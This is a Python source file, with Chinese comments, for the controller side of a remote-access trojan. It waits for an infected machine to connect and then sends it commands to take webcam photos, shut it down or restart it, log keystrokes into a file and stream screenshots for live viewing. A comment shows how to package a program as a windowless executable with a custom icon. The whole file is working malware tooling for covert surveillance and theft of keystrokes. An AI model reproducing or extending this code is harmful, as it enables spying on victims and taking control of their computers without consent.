import sys , threading,cv2

from socket import *

from PIL import ImageGrab
# pyinstaller -F -w -i 图片文件名 python程序名

#准备一个设备
S = socket()
#给套接字一个号码  223.160.115.186
S.bind(('0.0.0.0',8080))
#网络号码：（ip地址，port端口号）
S.listen()     #准备号码 插上网线 开机待机
#有木马申请上线    S监听套接字
s ,addr = S.accept()
print('一个小可爱已上线',addr[0])

def reveive_key():
    while True:
        key_name = s.recv(1024).decode('utf-8')
        with open('log.txt', 'a') as f:
            f.write(key_name + '    ')


#建立一个新的线程
logger =threading.Thread(target=reveive_key,daemon=True)


print('1.拍照 2. 关机 3.重启 4.记录 5.监视 6.退出')
command = input('请操作！')

try:
    s.send(command.encode())
except ConnectionResetError:
    print('服务器连接已断开，请重新启动服务器')
    sys.exit(1)
except Exception as e:
    print(f"发送命令时出错{e}")

if command == '6':
    sys.exit(0)
if command == '1':
    filesize = int(s.recv(1024).decode())
    s.send('ojbk'.encode('utf-8'))
    # 收照片 保存
    #目标是多少，实际收到多少
    cursize = 0
    with open('1.png', 'wb') as f:
        while cursize < filesize:
            data = s.recv(2048)
            f.write(data)
            cursize += len(data)  # 加上实际收到的
elif command == '4':
    #执行线程
    logger.start()
elif command == '5':
    while True:
        file_size = int (s.recv(1024).decode())#接受截图
        # s.send('objk'.encode('utf-8'))

        cur_size = 0
        with open('2.png', 'wb') as f:
            while cur_size < file_size:
                data = s.recv(2048)
                f.write(data)
                cur_size += len(data)  # 加上实际收到的
        # cv2.namedWindow("image")
        img = cv2.imread('2.png')
        cv2.imshow("image", img)
        cv2.waitKey(10)
        cv2.destroyAllWindows()

S.close()
s.close()